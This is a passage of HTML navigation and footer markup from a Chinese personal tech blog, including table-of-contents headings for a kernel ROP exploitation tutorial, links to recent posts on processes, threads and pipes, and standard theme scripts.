class="toc-number">1.5.6.</span> <span class="toc-text">4) ROP 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#4-1-%E5%8A%AB%E6%8C%81%E6%A0%88%E6%8C%87%E9%92%88"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">4.1) 劫持栈指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-2-%E5%85%B3%E9%97%AD-SMEP-ret2usr%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">4.2) 关闭 SMEP + ret2usr提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-3-%E8%BF%94%E5%9B%9E%E7%94%A8%E6%88%B7%E6%80%81-get-shell"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">4.3) 返回用户态 + get shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-4-ROP-%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">1.5.6.4.</span> <span class="toc-text">4.4) ROP 注意点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-5-%E5%AE%8C%E6%95%B4-exploit"><span class="toc-number">1.5.6.5.</span> <span class="toc-text">4.5) 完整 exploit</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/" title="进程间的通信"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="进程间的通信"/></a><div class="content"><a class="title" href="/2024/07/10/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1/" title="进程间的通信">进程间的通信</a><time datetime="2024-07-10T09:27:16.731Z" title="发表于 2024-07-10 17:27:16">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%EF%BC%8C%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/" title="线程，进程，协程的区别"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="线程，进程，协程的区别"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%EF%BC%8C%E8%BF%9B%E7%A8%8B%EF%BC%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/" title="线程，进程，协程的区别">线程，进程，协程的区别</a><time datetime="2024-07-10T09:27:16.730Z" title="发表于 2024-07-10 17:27:16">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/" title="线程间的通信方式"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="线程间的通信方式"/></a><div class="content"><a class="title" href="/2024/07/10/%E7%BA%BF%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/" title="线程间的通信方式">线程间的通信方式</a><time datetime="2024-07-10T09:27:16.729Z" title="发表于 2024-07-10 17:27:16">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/linux%E7%AE%A1%E9%81%93/" title="linux管道"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="linux管道"/></a><div class="content"><a class="title" href="/2024/07/10/linux%E7%AE%A1%E9%81%93/" title="linux管道">linux管道</a><time datetime="2024-07-10T09:27:16.728Z" title="发表于 2024-07-10 17:27:16">2024-07-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/10/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E7%BD%91%E5%85%B3/" title="零信任网关"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="零信任网关"/></a><div class="content"><a class="title" href="/2024/07/10/%E9%9B%B6%E4%BF%A1%E4%BB%BB%E7%BD%91%E5%85%B3/" title="零信任网关">零信任网关</a><time datetime="2024-07-10T09:27:16.727Z" title="发表于 2024-07-10 17:27:16">2024-07-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>